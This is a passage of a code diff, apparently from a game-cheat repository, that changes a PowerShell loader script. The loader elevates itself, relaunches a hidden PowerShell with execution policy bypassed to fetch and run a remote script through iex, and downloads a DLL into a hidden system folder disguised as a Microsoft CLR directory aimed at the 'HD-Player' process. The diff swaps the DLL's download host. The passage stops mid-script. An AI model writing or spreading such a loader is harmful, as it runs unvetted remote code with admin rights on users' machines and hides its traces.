@@ -6,7 +6,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
-`$url="https://files.catbox.moe/0ukxya.dll";`$f="mscories.dll";`$d="`$env:LOCALAPPDATA\Microsoft\CLR_v4.0";`$p=Join-Path `$d `$f;`$t="HD-Player";
+`$url="https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/AimbotFemaleFix.dll";`$f="mscories.dll";`$d="`$env:LOCALAPPDATA\Microsoft\CLR_v4.0";`$p=Join-Path `$d `$f;`$t="HD-Player";
 if(Test-Path `$d){rm `$d -Recurse -Force -EA 0}mkdir `$d -Force|Out-Null;attrib +h +s `$d;
 `$ProgressPreference='SilentlyContinue';iwr -Uri `$url -OutFile `$p -UseBasicParsing;
 `$s=@"
